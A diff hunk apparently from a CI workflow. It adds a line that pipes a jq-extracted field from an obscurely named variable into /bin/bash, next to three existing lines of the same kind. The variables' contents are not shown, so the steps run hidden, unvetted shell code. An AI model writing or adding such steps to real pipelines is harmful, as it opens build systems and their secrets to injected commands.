@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$vxku997" | jq -r .dvdo8 | /bin/bash
           echo $ftp17977 | jq -r .iki2511 | /bin/bash
           printf '%s' "$rof1" | jq -r .jsc082 | /bin/bash
+          printf '%s' "$khu51886" | jq -r .g16 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
